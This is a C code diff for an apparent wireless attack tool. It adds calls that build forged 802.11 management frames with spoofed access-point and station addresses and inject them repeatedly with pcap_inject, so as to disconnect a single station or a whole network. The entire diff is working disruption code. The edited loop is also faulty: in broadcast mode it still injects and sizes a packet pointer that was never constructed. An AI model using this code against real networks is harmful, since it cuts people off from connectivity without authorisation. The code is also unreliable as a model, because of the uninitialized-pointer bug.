@@ -3,7 +3,7 @@
 
 void action_distrupt_station(struct loki_state*);
 void action_distrupt_network(struct loki_state*);
-void action_send_disruption(uint8_t*, uint8_t*, uint8_t*, uint16_t, pcap_t*);
+void action_send_disruption(uint8_t*, uint8_t*, uint8_t*, uint16_t, uint8_t, pcap_t*);
 
 struct mode_controller *create_mode_controller() {
 	struct mode_controller *controller;
@@ -185,6 +185,7 @@ void action_distrupt_station(struct loki_state *state) {
 	char *status = (char*)malloc(sizeof(char)*48);
 	sprintf(status, "Disrupt station %s -> %s ", print_mac_address(macAp), print_mac_address(macSta));
 	set_status_message(status, state);
+	action_send_disruption(macAp, macSta, macAp, 10, 0, state->handle);
 }
 
 void action_distrupt_network(struct loki_state *state) {
@@ -205,14 +206,17 @@ void action_distrupt_network(struct loki_state *state) {
 	char *status = (char*)malloc(sizeof(char)*48);
 	sprintf(status, "Disrupt network %s -> %s ", print_mac_address(macAp), print_mac_address(macSta));
 	set_status_message(status, state);
+
+	action_send_disruption(macAp, macSta, macAp, 10, 1, state->handle);
 }
 
-void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uint16_t num, pcap_t *handle) {
+void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uint16_t num, uint8_t broadcast, pcap_t *handle) {
 	struct header_radiotap *tap;
 	struct mac80211_management_hdr *headerToSta, *headerToAp;
 	struct mac80211_control ctrl;
 	uint32_t total;
 	uint8_t *packetToSta, *packetToAp;
+
 	size_t lenSta, lenAp;
 
 	ctrl = (struct mac80211_control) {
@@ -235,22 +239,22 @@ void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uin
 	headerToAp = construct_header_management(macSta, macAp, bssid, &ctrl);
 
 	total = 0;
-	while(total < num) {
+	while(total++ < num) {
 		headerToSta->seqctrl = total<<4;
 		headerToAp->seqctrl = total<<4;
-		packetToSta = construct_packet(tap, headerToSta, 0x7, &lenSta);
+			packetToSta = construct_packet(tap, headerToSta, 0x7, &lenSta);
 
-		packetToAp = construct_packet(tap, headerToAp, 0x3, &lenAp);
+		if(!broadcast)
+			packetToAp = construct_packet(tap, headerToAp, 0x3, &lenAp);
 		
-		if(total < 10)
-			pcap_inject(handle, (void*)packetToSta, (int)lenSta);
+		pcap_inject(handle, (void*)packetToSta, (int)lenSta);
 		pcap_inject(handle, (void*)packetToAp, (int)lenAp);
 		
 		usleep(50000);
-		printf("\r%05d packets", ++total);
 		fflush(stdout);
 
 		free(packetToSta);
-		free(packetToAp);
+		if(!broadcast)
+			free(packetToAp);
 	}
 }
